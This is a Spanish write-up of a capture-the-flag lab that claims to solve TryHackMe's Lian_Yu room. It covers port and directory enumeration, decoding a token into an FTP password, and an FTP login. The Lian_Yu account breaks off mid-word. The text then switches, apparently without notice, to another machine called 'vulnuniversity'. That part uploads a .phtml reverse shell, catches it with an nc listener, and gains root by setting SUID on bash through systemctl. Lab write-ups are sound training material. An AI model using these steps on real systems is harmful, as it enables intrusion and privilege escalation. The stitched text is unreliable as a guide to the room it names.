---
title: TryHackMe Lian_Yu Writeup
published: false
---

La máquina Lian_Yu, es una máquina de TryHackMe en la que mediante el seguimiento de la room en TryHackMe conseguiremos resolver una serie de preguntas que nos plantean:

* ¿Cuál es el directorio web encontrado?<br>
    ****
* ¿Cuál es el nombre del archivo que encunetras?<br>
    **********.*****
* ¿Cuál es la contraseña de FTP?<br>
    *********
* ¿Cuál es el nombre del archivo que tiene la contraseña de SSH?<br>
    *****
* ¿user.txt?<br>
    ????????????????????????
* ¿root.txt?<br>
    ????????????????????????


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 13:48 EDT
Initiating SYN Stealth Scan at 13:48
Scanning 10.10.231.51 [65535 ports]
Discovered open port 111/tcp on 10.10.231.51
Discovered open port 22/tcp on 10.10.231.51
Discovered open port 21/tcp on 10.10.231.51
Discovered open port 80/tcp on 10.10.231.51
Discovered open port 55237/tcp on 10.10.231.51
Completed SYN Stealth Scan at 13:49, 12.05s elapsed (65535 total ports)
Nmap scan report for 10.10.231.51
Host is up, received user-set (0.048s latency).
Scanned at 2022-10-31 13:48:54 EDT for 12s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 63
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
55237/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
           Raw packets sent: 66006 (2.904MB) | Rcvd: 66339 (2.731MB)

```
 
Con el puerto 80 abierto, introducimos la dirección IP en el buscador y nos reporta una pequeña explicación sobre la máquina, pero nada más. Puesto que en la primera pregunta nos pregunta por directorio oculto vamos a tratar de analizarlos con gobuster:

```bash
❯ gobuster dir -u http://10.10.231.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.51
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/31 13:56:13 Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 235] [--> http://10.10.231.51/island/]
```
Conseguimos un directorio en el que si inspeccionamos la página desde nuestro buscador nos reporta un potencial usuario o contraseña en el código fuente:

> "<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>"

Tratamos de seguir buscando directorios desde /island porque el que nos piden no nos lo ha registrado. 

```bash
❯ gobuster dir -u http://10.10.231.51/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.51/island
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/31 13:59:30 Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 240] [--> http://10.10.231.51/island/2100/]
Progress: 33865 / 220561 (15.35%)                                                    ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/10/31 14:00:31 Finished
===============================================================
```

Encontramos /island/2100 (1ª pregunta) y en el código fuente podemos observar un comentario en el que se menciona .ticket

Podría ser una extensión de un archivo y en la siguiente pregunta nos solicitan el nombre de un archivo por lo que con gobuster volvemos a analizar directorios ocultos (en este punto añadimos la extensión de archivo .ticket):

```bash
❯ gobuster dir -u http://10.10.231.51/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -x ticket
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.51/island/2100
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
2022/10/31 14:07:05 Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
Progress: 39000 / 441122 (8.84%)             ^C
[!] Keyboard interrupt detected, terminating.
                                              
===============================================================
2022/10/31 14:08:13 Finished
===============================================================
```

Nos reporta la respuesta a la siguiente pregunta y al dirigirnos a este se muestra lo siguiente:

> This is just a token to get into Queen's Gambit(Ship)
>
> RTy8yhBQdscX

Tras un tiempo intentando descodificarlo, lo consigo con base 58

> !#th3h00d

Teniendo en cuenta que esta es la contraseña FTP que nos piden, intentamos conectarnos por este medio con el name vigilante (conseguido anteriormente) y la contraseña que acabamos de conseguir

Vemos tres ar

```bash
❯ ftp 10.10.231.51
Connected to 10.10.231.51.
220 (vsFTPd 3.0.2)
Name (10.10.231.51:jorge): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57120|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
```

Con el escaneo de servicio y versiones podemos ver que la versión es la 3.5.12, que estamos frente a un Ubuntu y que el puerto por le que corre el servidor web es el 3333.

Sabemos independientemente de esto que -n No aplica resolución DNS y que con -p-400 escaneará los 400 puertos más comunes.

# [](#header-1)Acceso al sistema 

Para localizar los directorios ocultos usaremos gobuster:

```bash
❯ gobuster dir -u http://10.10.244.174:3333 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.174:3333
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/25 12:22:14 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 299]
/.htaccess.html       (Status: 403) [Size: 304]
/.htaccess.txt        (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 299]
/.htpasswd.php        (Status: 403) [Size: 303]
/.htpasswd.html       (Status: 403) [Size: 304]
/.htpasswd.txt        (Status: 403) [Size: 303]
/.hta                 (Status: 403) [Size: 294]
/.hta.php             (Status: 403) [Size: 298]
/.hta.html            (Status: 403) [Size: 299]
/.hta.txt             (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 319] [--> http://10.10.244.174:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.244.174:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.244.174:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                      
/index.html           (Status: 200) [Size: 33014]                                      
/internal             (Status: 301) [Size: 324] [--> http://10.10.244.174:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.244.174:3333/js/]      
/server-status        (Status: 403) [Size: 303]                                          
                                                                                         
===============================================================
2022/10/25 12:22:57 Finished
===============================================================

```

Buscando los directorios nos fijamos que el directorio /internal/ es el que presenta la página de subida de archivos.


Por norma general, los archivos .php suelen estar restringidos. Probamos en TryHackMe y resolvemos la siguiente pregunta.

Siguiendo los pasos de la room de TryHackMe, podemos observar que la extensión .phtml está permitida. 

Entonces, nos bajaremos la reverse shell de la página que nos facilita TryHackMe cambiando la IP (que deberá de ser la nuestra) y el puerto por el que estemos a la escucha.

Subimos la reverse shell y mientras estamos en escucha la ejecutamos desde /internal/uploads

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.8.4.179] from (UNKNOWN) [10.10.244.174] 38976
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:27:07 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Conseguimos acceso a la máquina. Podemos ver el usuario de la siguiente manera: 

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home  
$ ls
bill
$ 
```

Conseguimos la flag del usuario:

```bash
$ cd bill
$ ls
user.txt
$ cat user.txt  
?????????????????????????
```

# [](#header-1)Escalada de privilegios 

Desde TryHackMe nos preguntan por archivos inusuales con permisos SUID. Para buscarlos haremos:

```bash
$ find / -type f -perm -4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
---> /bin/systemctl
/bin/bash
/bin/ping
/bin/fusermount
/sbin/mount.cifs
$ 
```

Observamos así el directorio inusual. Sabiendo que ese archivo tiene permisos SUID, buscamos en <a href="https://gtfobins.github.io/gtfobins/systemctl/"> GTFOBins </a> y conseguimos la forma de escalar privilegios. 

Únicamente deberemos introducir el comando chmod +s /bin/bash en el apartado de "id > /tmp/output"

Por otro lado deberemos indicar la ruta absoluta de ./systemctl -> /bin/systemctl

Una vez realizado, comprobamos si tenemos el permiso s con:

```bash
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Lo tenemos, hacemos bash -p para obtener la bash como root y conseguimos la flag de root.

```bash
$ bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root
ls
root.txt
cat root.txt
???????????????????????
```

Muchas gracias por leer este writeup, espero que te haya gustado!
